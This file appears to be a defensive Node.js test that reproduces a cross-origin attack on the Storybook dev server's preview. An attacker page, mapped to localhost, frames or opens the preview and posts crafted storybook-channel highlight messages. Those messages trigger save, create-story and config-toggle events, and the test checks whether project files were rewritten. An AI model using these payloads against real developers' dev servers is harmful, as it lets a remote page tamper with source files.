/**
 * Spec for the Storybook dev-server preview attack against this repo's locked Storybook.
 *
 * These tests fail while storybook 10.2.14 is installed. They pass once the dev server
 * refuses remote framing and the development preview ignores channel messages from a
 * non-local origin (the fixes shipped in storybook 10.6.2).
 *
 * Run from the repository root, after `pnpm install`:
 *   node --test security-tests/storybook-dev-preview-cross-origin.test.mjs
 *
 * Requires Google Chrome at /usr/bin/google-chrome. The browser is started with the local-network
 * prompt and the popup blocker turned off so the test can perform the user interaction the
 * attack needs. Storybook itself is the unmodified `storybook dev` binary from node_modules.
 */

import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdir, mkdtemp, readFile, readdir, rm, symlink, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { tmpdir } from "node:os";
import path from "node:path";
import test from "node:test";
import { fileURLToPath } from "node:url";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const chromePath = "/usr/bin/google-chrome";
const storybookBin = path.join(repoRoot, "node_modules", ".bin", "storybook");
const evilHost = "evil.blueprint.test";

const storySource = `import React from "react";

export default {
    title: "Victim",
};

export const Primary = {
    args: { label: "ok" },
    render: (args: { label: string }) => React.createElement("button", { id: "victim" }, args.label),
};
`;

const buttonSource = `import React from "react";

export function Button() {
    return React.createElement("button", null, "button");
}
`;

const mainSource = `import type { StorybookConfig } from "@storybook/react-vite";

const config: StorybookConfig = {
    stories: ["../stories/**/*.stories.tsx"],
    framework: "@storybook/react-vite",
    core: { disableTelemetry: true },
};

export default config;
`;

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function freePort() {
    return new Promise((resolve, reject) => {
        const server = createServer();
        server.once("error", reject);
        server.listen(0, "127.0.0.1", () => {
            const address = server.address();
            const port = typeof address === "object" && address ? address.port : 0;
            server.close(error => (error ? reject(error) : resolve(port)));
        });
    });
}

function headersOf(response) {
    const headers = {};
    for (const [key, value] of response.headers) {
        headers[key.toLowerCase()] = value;
    }
    return headers;
}

/**
 * A remote page must not be a frame ancestor of the dev server.
 * Port wildcards on loopback hosts are the Storybook 10.6.2 policy; a bare `*` is not.
 */
function framingRestrictsRemote(headers) {
    const xfo = (headers["x-frame-options"] || "").toLowerCase();
    if (xfo === "deny" || xfo === "sameorigin") {
        return true;
    }
    const csp = headers["content-security-policy"] || "";
    const directive = csp
        .split(";")
        .map(part => part.trim())
        .find(part => /^frame-ancestors\b/i.test(part));
    if (!directive) {
        return false;
    }
    const sources = directive
        .replace(/^frame-ancestors\s+/i, "")
        .split(/\s+/)
        .filter(Boolean);
    return (
        sources.length > 0 &&
        sources.every(
            source =>
                source === "'self'" ||
                source === "'none'" ||
                /^https?:\/\/localhost:\*$/.test(source) ||
                /^https?:\/\/\*\.localhost:\*$/.test(source) ||
                /^https?:\/\/127\.0\.0\.1:\*$/.test(source),
        )
    );
}

class Cdp {
    /** @param {string} webSocketUrl */
    constructor(webSocketUrl) {
        this.webSocketUrl = webSocketUrl;
        this.next = 0;
        this.pending = new Map();
        this.socket = null;
    }

    async open() {
        this.socket = new WebSocket(this.webSocketUrl);
        await new Promise((resolve, reject) => {
            this.socket.addEventListener("open", resolve, { once: true });
            this.socket.addEventListener("error", reject, { once: true });
        });
        this.socket.addEventListener("message", event => {
            const message = JSON.parse(event.data);
            if (message.id && this.pending.has(message.id)) {
                const { resolve, reject } = this.pending.get(message.id);
                this.pending.delete(message.id);
                if (message.error) {
                    reject(new Error(JSON.stringify(message.error)));
                } else {
                    resolve(message.result);
                }
            }
        });
    }

    send(method, params = {}, sessionId) {
        const id = ++this.next;
        const message = { id, method, params };
        if (sessionId) {
            message.sessionId = sessionId;
        }
        return new Promise((resolve, reject) => {
            this.pending.set(id, { resolve, reject });
            this.socket.send(JSON.stringify(message));
        });
    }

    close() {
        this.socket?.close();
    }
}

async function waitForHttp(url, timeoutMs) {
    const started = Date.now();
    let lastError = "no response";
    while (Date.now() - started < timeoutMs) {
        try {
            const response = await fetch(url);
            if (response.ok) {
                return response;
            }
            lastError = `${response.status} ${response.statusText}`;
        } catch (error) {
            lastError = error instanceof Error ? error.message : String(error);
        }
        await sleep(250);
    }
    throw new Error(`Timed out waiting for ${url}: ${lastError}`);
}

async function evaluate(cdp, sessionId, expression) {
    const result = await cdp.send(
        "Runtime.evaluate",
        { expression, returnByValue: true, awaitPromise: true },
        sessionId,
    );
    if (result.exceptionDetails) {
        throw new Error(
            result.exceptionDetails.exception?.description || result.exceptionDetails.text || "Runtime.evaluate failed",
        );
    }
    return result.result?.value;
}

test(
    "a remote page cannot frame the Storybook dev server or change project files through its preview",
    { timeout: 180_000 },
    async () => {
        const storybookVersion = JSON.parse(
            await readFile(path.join(repoRoot, "node_modules", "storybook", "package.json"), "utf8"),
        ).version;
        const fixture = await mkdtemp(path.join(tmpdir(), "storybook-preview-origin-"));
        const failures = [];
        /** @type {import('node:child_process').ChildProcess[]} */
        const children = [];
        /** @type {import('node:http').Server[]} */
        const servers = [];
        let cdp;
        let userDataDir;

        try {
            await mkdir(path.join(fixture, "stories"), { recursive: true });
            await mkdir(path.join(fixture, ".storybook"), { recursive: true });
            await writeFile(path.join(fixture, "stories", "Victim.stories.tsx"), storySource);
            await writeFile(path.join(fixture, "stories", "Button.tsx"), buttonSource);
            await writeFile(path.join(fixture, ".storybook", "main.ts"), mainSource);
            await symlink(path.join(repoRoot, "node_modules"), path.join(fixture, "node_modules"));

            const storyPort = await freePort();
            const debugPort = await freePort();
            const storybook = spawn(
                storybookBin,
                ["dev", "-p", String(storyPort), "--ci", "--exact-port", "--disable-telemetry", "--no-open", "--quiet"],
                {
                    cwd: fixture,
                    env: { ...process.env, STORYBOOK_DISABLE_TELEMETRY: "1" },
                    stdio: ["ignore", "pipe", "pipe"],
                },
            );
            children.push(storybook);
            let storybookLog = "";
            storybook.stdout.on("data", chunk => {
                storybookLog += chunk.toString();
            });
            storybook.stderr.on("data", chunk => {
                storybookLog += chunk.toString();
            });

            const indexUrl = `http://127.0.0.1:${storyPort}/index.json`;
            let indexResponse;
            try {
                indexResponse = await waitForHttp(indexUrl, 90_000);
            } catch (error) {
                throw new Error(`${error instanceof Error ? error.message : error}\n${storybookLog}`);
            }
            const index = await indexResponse.json();
            const story = index.entries?.["victim--primary"];
            assert.ok(story, `storybook ${storybookVersion} did not index victim--primary`);
            assert.equal(story.importPath, "./stories/Victim.stories.tsx");

            for (const pathname of ["/", "/iframe.html"]) {
                const response = await fetch(`http://127.0.0.1:${storyPort}${pathname}`);
                const headers = headersOf(response);
                if (!framingRestrictsRemote(headers)) {
                    failures.push(
                        `${pathname} from storybook ${storybookVersion} does not restrict frame ancestors ` +
                            `(content-security-policy: ${headers["content-security-policy"] || "<absent>"}, ` +
                            `x-frame-options: ${headers["x-frame-options"] || "<absent>"})`,
                    );
                }
            }

            const previewUrl = `http://127.0.0.1:${storyPort}/iframe.html?id=victim--primary&viewMode=story`;
            const attacker = createServer((request, response) => {
                response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
                response.end(`<!doctype html>
<html><body>
<button id="open">Open preview</button>
<iframe id="sb" src="${previewUrl}" style="width:900px;height:700px"></iframe>
<script>
document.getElementById("open").addEventListener("click", () => {
  window.__popup = window.open(${JSON.stringify(previewUrl)}, "storybook-preview");
});
window.__post = (which, message) => {
  const frame = document.getElementById("sb");
  const target = which === "iframe" ? frame && frame.contentWindow : window.__popup;
  if (!target) return "missing";
  target.postMessage(message, "*");
  return "sent";
};
</script>
</body></html>`);
            });
            servers.push(attacker);
            const attackerPort = await new Promise((resolve, reject) => {
                attacker.once("error", reject);
                attacker.listen(0, "127.0.0.1", () => {
                    const address = attacker.address();
                    resolve(typeof address === "object" && address ? address.port : 0);
                });
            });

            userDataDir = await mkdtemp(path.join(tmpdir(), "chrome-storybook-preview-"));
            const chrome = spawn(
                chromePath,
                [
                    "--headless=old",
                    "--disable-gpu",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                    `--remote-debugging-port=${debugPort}`,
                    `--user-data-dir=${userDataDir}`,
                    `--host-resolver-rules=MAP ${evilHost} 127.0.0.1`,
                    "--disable-popup-blocking",
                    "--disable-background-timer-throttling",
                    "--disable-backgrounding-occluded-windows",
                    "--disable-renderer-backgrounding",
                    "--disable-features=LocalNetworkAccessChecks,PrivateNetworkAccessForNavigations,BlockInsecurePrivateNetworkRequests,PrivateNetworkAccessSendPreflights",
                    "about:blank",
                ],
                { stdio: "ignore" },
            );
            children.push(chrome);
            const version = await waitForHttp(`http://127.0.0.1:${debugPort}/json/version`, 15_000).then(response =>
                response.json(),
            );
            cdp = new Cdp(version.webSocketDebuggerUrl);
            await cdp.open();

            const { targetId } = await cdp.send("Target.createTarget", {
                url: `http://${evilHost}:${attackerPort}/`,
            });
            await cdp.send("Target.activateTarget", { targetId });
            const { sessionId: attackerSession } = await cdp.send("Target.attachToTarget", {
                targetId,
                flatten: true,
            });
            await cdp.send("Runtime.enable", {}, attackerSession);
            await cdp.send("Page.enable", {}, attackerSession);
            await cdp.send("Emulation.setFocusEmulationEnabled", { enabled: true }, attackerSession).catch(() => {});
            await cdp.send("Page.setWebLifecycleState", { state: "active" }, attackerSession).catch(() => {});
            // Headless Chrome does not run requestAnimationFrame in a cross-origin iframe unless
            // the embedding page is being painted. Storybook creates highlight boxes from that callback.
            await cdp.send(
                "Page.startScreencast",
                { format: "jpeg", quality: 10, everyNthFrame: 1, maxWidth: 800, maxHeight: 600 },
                attackerSession,
            );
            // A real click is the user interaction the attack needs. Popup blocking is disabled
            // because this headless session has no permission prompt to accept.
            let openNodeId = 0;
            const openDeadline = Date.now() + 10_000;
            while (Date.now() < openDeadline && !openNodeId) {
                const documentNode = await cdp.send("DOM.getDocument", {}, attackerSession);
                const found = await cdp.send(
                    "DOM.querySelector",
                    { nodeId: documentNode.root.nodeId, selector: "#open" },
                    attackerSession,
                );
                openNodeId = found.nodeId;
                if (!openNodeId) {
                    await sleep(100);
                }
            }
            if (!openNodeId) {
                throw new Error("Attacker page did not render the control that opens the preview");
            }
            const box = await cdp.send("DOM.getBoxModel", { nodeId: openNodeId }, attackerSession);
            const [x1, y1, x2, y2] = [
                box.model.content[0],
                box.model.content[1],
                box.model.content[2],
                box.model.content[5],
            ];
            const clickX = (x1 + x2) / 2;
            const clickY = (y1 + y2) / 2;
            for (const type of ["mousePressed", "mouseReleased"]) {
                await cdp.send(
                    "Input.dispatchMouseEvent",
                    { type, x: clickX, y: clickY, button: "left", clickCount: 1 },
                    attackerSession,
                );
            }

            const previewPaths = [
                ["iframe", "iframe"],
                ["popup", "page"],
            ];
            /** @type {{ which: string, sessionId: string }[]} */
            const previews = [];
            const seenTargets = new Set();
            const previewDeadline = Date.now() + 20_000;
            let popupSeenAt = 0;
            while (Date.now() < previewDeadline && previews.length < 2) {
                const targets = await fetch(`http://127.0.0.1:${debugPort}/json/list`).then(response =>
                    response.json(),
                );
                for (const [which, type] of previewPaths) {
                    if (previews.some(preview => preview.which === which)) {
                        continue;
                    }
                    const target = targets.find(
                        entry =>
                            entry.type === type &&
                            typeof entry.url === "string" &&
                            entry.url.includes("/iframe.html") &&
                            !seenTargets.has(entry.id),
                    );
                    if (!target) {
                        continue;
                    }
                    seenTargets.add(target.id);
                    const { sessionId } = await cdp.send("Target.attachToTarget", {
                        targetId: target.id,
                        flatten: true,
                    });
                    await cdp.send("Runtime.enable", {}, sessionId);
                    await cdp.send("Page.enable", {}, sessionId).catch(() => {});
                    await cdp.send("Emulation.setFocusEmulationEnabled", { enabled: true }, sessionId).catch(() => {});
                    await cdp.send("Page.setWebLifecycleState", { state: "active" }, sessionId).catch(() => {});
                    await cdp
                        .send(
                            "Page.startScreencast",
                            { format: "jpeg", quality: 10, everyNthFrame: 1, maxWidth: 800, maxHeight: 600 },
                            sessionId,
                        )
                        .catch(() => {});
                    await cdp.send("Target.activateTarget", { targetId: target.id }).catch(() => {});
                    previews.push({ which, sessionId });
                    if (which === "popup") {
                        popupSeenAt = Date.now();
                    }
                }
                if (
                    popupSeenAt &&
                    Date.now() - popupSeenAt > 5_000 &&
                    !previews.some(preview => preview.which === "iframe")
                ) {
                    break;
                }
                await sleep(200);
            }

            const popup = previews.find(preview => preview.which === "popup");
            if (!popup) {
                throw new Error(
                    "The attacker page could not open the Storybook preview. The file-write check needs that window.",
                );
            }
            const embedded = previews.some(preview => preview.which === "iframe");
            if (embedded) {
                failures.push(
                    `http://${evilHost}:${attackerPort} embedded ${previewUrl}. A remote origin must not be able to frame the dev preview.`,
                );
            }

            const attacks = [
                {
                    name: "saveStoryRequest",
                    highlight: {
                        id: "attack-save",
                        selectors: ["#victim"],
                        priority: 1,
                        menu: [
                            [
                                {
                                    id: {
                                        id: "save-from-remote",
                                        payload: {
                                            csfId: "victim--primary",
                                            importPath: story.importPath,
                                            args: JSON.stringify({ label: "PWNED_BY_CROSS_ORIGIN" }),
                                        },
                                    },
                                    title: "Save",
                                    clickEvent: "saveStoryRequest",
                                },
                            ],
                        ],
                    },
                },
                {
                    name: "createNewStoryfileRequest",
                    highlight: {
                        id: "attack-create",
                        selectors: ["#victim"],
                        priority: 1,
                        menu: [
                            [
                                {
                                    id: {
                                        id: "create-from-remote",
                                        payload: {
                                            componentFilePath: "./stories/Button.tsx",
                                            componentExportName: "Button",
                                            componentIsDefaultExport: false,
                                            componentExportCount: 1,
                                        },
                                    },
                                    title: "Create",
                                    clickEvent: "createNewStoryfileRequest",
                                },
                            ],
                        ],
                    },
                },
                {
                    name: "toggleWhatsNewNotifications",
                    highlight: {
                        id: "attack-config",
                        selectors: ["#victim"],
                        priority: 1,
                        menu: [
                            [
                                {
                                    id: { disableWhatsNewNotifications: true },
                                    title: "Toggle",
                                    clickEvent: "toggleWhatsNewNotifications",
                                },
                            ],
                        ],
                    },
                },
            ];

            for (const preview of previews) {
                const readyDeadline = Date.now() + 20_000;
                let victimReady = false;
                while (Date.now() < readyDeadline) {
                    victimReady = await evaluate(
                        cdp,
                        preview.sessionId,
                        `Boolean(document.querySelector("#victim") && globalThis.__STORYBOOK_HIGHLIGHT_INITIALIZED)`,
                    );
                    if (victimReady) {
                        break;
                    }
                    await sleep(200);
                }
                if (!victimReady) {
                    throw new Error(
                        `Preview (${preview.which}) did not render #victim with the highlight channel ready`,
                    );
                }
                // The preview clears highlights when a story render phase starts. Wait until that
                // first render has settled so the attack message is still applied when we click.
                await sleep(1_500);

                for (const attack of attacks) {
                    // A same-origin message is delivered first. A fix that remembers "a local
                    // origin was seen" and then accepts the next sender still fails below.
                    await evaluate(
                        cdp,
                        preview.sessionId,
                        `window.postMessage(${JSON.stringify({
                            key: "storybook-channel",
                            event: {
                                type: "storybook/highlight/reset",
                                args: [],
                                from: "preview",
                            },
                        })}, "*"); "reset"`,
                    );
                    await evaluate(
                        cdp,
                        preview.sessionId,
                        `window.postMessage(${JSON.stringify({
                            key: "storybook-channel",
                            event: {
                                type: "storybook/highlight/add",
                                args: [
                                    {
                                        id: "local-only",
                                        selectors: ["#victim"],
                                        priority: -1,
                                        menu: [
                                            [
                                                {
                                                    id: "local",
                                                    title: "Local only",
                                                    clickEvent: "storybook/highlight/reset",
                                                },
                                            ],
                                        ],
                                    },
                                ],
                                from: "preview",
                            },
                        })}, "*"); "local"`,
                    );
                    const posted = await evaluate(
                        cdp,
                        attackerSession,
                        `window.__post(${JSON.stringify(preview.which)}, ${JSON.stringify({
                            key: "storybook-channel",
                            event: {
                                type: "storybook/highlight/add",
                                args: [attack.highlight],
                                from: evilHost,
                            },
                        })})`,
                    );
                    if (posted !== "sent") {
                        throw new Error(`Attacker page could not message the ${preview.which} preview (${posted})`);
                    }
                    let boxReady = false;
                    const boxDeadline = Date.now() + 3_000;
                    while (Date.now() < boxDeadline && !boxReady) {
                        await evaluate(
                            cdp,
                            attackerSession,
                            `window.__post(${JSON.stringify(preview.which)}, ${JSON.stringify({
                                key: "storybook-channel",
                                event: {
                                    type: "storybook/highlight/add",
                                    args: [attack.highlight],
                                    from: evilHost,
                                },
                            })})`,
                        );
                        boxReady = await evaluate(
                            cdp,
                            preview.sessionId,
                            `(() => {
                                const victim = document.querySelector("#victim");
                                if (victim) {
                                    victim.style.display = "block";
                                    victim.style.width = victim.style.width === "90px" ? "91px" : "90px";
                                    victim.style.height = "40px";
                                }
                                return Boolean(
                                    [...document.querySelectorAll("#storybook-highlights-root > div")].some(
                                        element => element.id !== "storybook-highlights-menu",
                                    )
                                );
                            })()`,
                        );
                        if (!boxReady) {
                            await sleep(100);
                        }
                    }
                    const clicked = await evaluate(
                        cdp,
                        preview.sessionId,
                        `(() => {
                            const box = [...document.querySelectorAll("#storybook-highlights-root > div")].find(
                                element => element.id !== "storybook-highlights-menu",
                            );
                            if (!box) return { error: "no highlight box" };
                            const rect = box.getBoundingClientRect();
                            const left = Number.isFinite(Number.parseFloat(box.style.left))
                                ? Number.parseFloat(box.style.left)
                                : rect.left + window.scrollX;
                            const top = Number.isFinite(Number.parseFloat(box.style.top))
                                ? Number.parseFloat(box.style.top)
                                : rect.top + window.scrollY;
                            const width = Number.isFinite(Number.parseFloat(box.style.width))
                                ? Number.parseFloat(box.style.width)
                                : rect.width;
                            const height = Number.isFinite(Number.parseFloat(box.style.height))
                                ? Number.parseFloat(box.style.height)
                                : rect.height;
                            const x = left + Math.max(width, 8) / 2;
                            const y = top + Math.max(height, 8) / 2;
                            const event = new MouseEvent("click", {
                                bubbles: true,
                                cancelable: true,
                                clientX: x - window.scrollX,
                                clientY: y - window.scrollY,
                            });
                            document.dispatchEvent(event);
                            return { x, y, left, top, width, height, pageX: event.pageX, pageY: event.pageY };
                        })()`,
                    );
                    let labels = [];
                    const menuDeadline = Date.now() + 2_000;
                    while (Date.now() < menuDeadline && labels.length === 0) {
                        labels = await evaluate(
                            cdp,
                            preview.sessionId,
                            `(() => {
                                const buttons = [...document.querySelectorAll("#storybook-highlights-menu button.menu-item")];
                                buttons.forEach(button => button.click());
                                return buttons.map(button => button.innerText);
                            })()`,
                        );
                        if (labels.length === 0) {
                            await sleep(100);
                        }
                    }
                    if (!labels.length) {
                        throw new Error(
                            `Highlight menu did not render in the ${preview.which} preview during ${attack.name}. ` +
                                `Same-origin highlight messages are still expected to render. click=${JSON.stringify(clicked)}`,
                        );
                    }
                    await sleep(1_000);
                }
            }

            const storyAfter = await readFile(path.join(fixture, "stories", "Victim.stories.tsx"), "utf8");
            if (storyAfter !== storySource) {
                failures.push(
                    `saveStoryRequest from ${evilHost} changed stories/Victim.stories.tsx through the dev preview`,
                );
            }
            const created = await readdir(path.join(fixture, "stories"));
            if (created.includes("Button.stories.tsx") || created.includes("Button.stories.jsx")) {
                failures.push(
                    `createNewStoryfileRequest from ${evilHost} created ${created.filter(name => name.startsWith("Button.stories")).join(", ")}`,
                );
            }
            const mainAfter = await readFile(path.join(fixture, ".storybook", "main.ts"), "utf8");
            if (mainAfter !== mainSource) {
                failures.push(
                    `toggleWhatsNewNotifications from ${evilHost} rewrote .storybook/main.ts through the dev preview`,
                );
            }

            assert.deepEqual(failures, []);
        } finally {
            cdp?.close();
            for (const server of servers) {
                server.close();
            }
            for (const child of children) {
                if (!child.killed && child.pid) {
                    child.kill("SIGTERM");
                }
            }
            await sleep(200);
            for (const child of children) {
                if (child.exitCode === null && child.pid) {
                    child.kill("SIGKILL");
                }
            }
            await rm(fixture, { recursive: true, force: true });
            if (userDataDir) {
                await rm(userDataDir, { recursive: true, force: true });
            }
        }
    },
);
